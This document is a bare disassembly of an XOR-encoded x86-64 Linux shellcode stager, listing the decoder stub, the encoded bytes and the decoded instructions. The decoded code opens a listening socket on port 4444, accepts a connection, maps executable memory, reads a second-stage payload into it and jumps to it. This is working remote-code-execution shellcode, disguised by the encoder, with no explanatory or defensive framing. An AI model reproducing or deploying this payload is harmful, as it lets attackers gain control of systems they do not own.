# Stager.

Machine Code Disassembly
Architecture: x86
Mode: 64
Syntax: intel

- Decoder Stub:

Address           Bytes                         Assembly
--------------------------------------------------------------------------------
0x0000000000000000  48 31 C9                      xor rcx, rcx
0x0000000000000003  48 81 E9 F6 FF FF FF          sub rcx, -0xa
0x000000000000000a  48 8D 05 EF FF FF FF          lea rax, [rip - 0x11]
0x0000000000000011  48 BB FB 70 2D 64 01 62 36 D3  movabs rbx, 0xd3366201642d70fb
0x000000000000001b  48 31 58 27                   xor qword ptr [rax + 0x27], rbx
0x000000000000001f  48 2D F8 FF FF FF             sub rax, -8
0x0000000000000025  E2 F4                         loop 0x1b

- Stub:

915975fd6b6069b9fa2e226149f56414ff542f64103e7e5a1d1a3d3e6b536edcfe29475659
6d339b6d1a063c0e676685a41a243c98d4269b72a66055c8081492a1c22a6b042aa09b6c2f2261fe8436d3

- Decoded Stub:

Address           Bytes                         Assembly
--------------------------------------------------------------------------------
0x0000000000000000  6A 29                         push 0x29
0x0000000000000002  58                            pop rax
0x0000000000000003  99                            cdq
0x0000000000000004  6A 02                         push 2
0x0000000000000006  5F                            pop rdi
0x0000000000000007  6A 01                         push 1
0x0000000000000009  5E                            pop rsi
0x000000000000000a  0F 05                         syscall
0x000000000000000c  48 97                         xchg rax, rdi
0x000000000000000e  52                            push rdx
0x000000000000000f  C7 04 24 02 00 11 5C          mov dword ptr [rsp], 0x5c110002
0x0000000000000016  48 89 E6                      mov rsi, rsp
0x0000000000000019  6A 10                         push 0x10
0x000000000000001b  5A                            pop rdx
0x000000000000001c  6A 31                         push 0x31
0x000000000000001e  58                            pop rax
0x000000000000001f  0F 05                         syscall
0x0000000000000021  59                            pop rcx
0x0000000000000022  6A 32                         push 0x32
0x0000000000000024  58                            pop rax
0x0000000000000025  0F 05                         syscall
0x0000000000000027  48 96                         xchg rax, rsi
0x0000000000000029  6A 2B                         push 0x2b
0x000000000000002b  58                            pop rax
0x000000000000002c  0F 05                         syscall
0x000000000000002e  50                            push rax
0x000000000000002f  56                            push rsi
0x0000000000000030  5F                            pop rdi
0x0000000000000031  6A 09                         push 9
0x0000000000000033  58                            pop rax
0x0000000000000034  99                            cdq
0x0000000000000035  B6 10                         mov dh, 0x10
0x0000000000000037  48 89 D6                      mov rsi, rdx
0x000000000000003a  4D 31 C9                      xor r9, r9
0x000000000000003d  6A 22                         push 0x22
0x000000000000003f  41 5A                         pop r10
0x0000000000000041  B2 07                         mov dl, 7
0x0000000000000043  0F 05                         syscall
0x0000000000000045  48 96                         xchg rax, rsi
0x0000000000000047  48 97                         xchg rax, rdi
0x0000000000000049  5F                            pop rdi
0x000000000000004a  0F 05                         syscall
0x000000000000004c  FF E6                         jmp rsi
0x000000000000004e  00 00                         add byte ptr [rax], al
